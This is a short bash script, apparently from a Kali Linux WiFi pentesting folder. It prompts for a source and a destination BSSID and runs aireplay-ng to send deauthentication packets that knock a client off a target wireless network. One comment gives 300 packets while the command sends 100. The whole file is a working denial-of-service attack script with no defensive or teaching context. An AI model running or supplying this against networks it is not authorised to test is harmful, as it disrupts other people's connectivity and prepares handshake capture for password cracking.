#!/bin/bash

# Change to the directory where your WiFi pentesting tools are located.
cd /home/kali/WifiPentesting/testingSomething

# Prompt the user to enter the BSSID (MAC address) of the target WiFi network.
echo "Enter the BSSID of the source target:"
read BSSID_S
echo "Enter the BSSID of the destination target:"
read BSSID_D


# Use aireplay-ng to deauthenticate devices connected to the target WiFi network.
# The '-a' flag specifies the BSSID, and '--deauth 300' indicates to send 300 deauthentication packets.
# 'wlan0' is assumed to be your wireless interface.
sudo aireplay-ng --deauth 100 -a $BSSID_S -c $BSSID_D wlan0
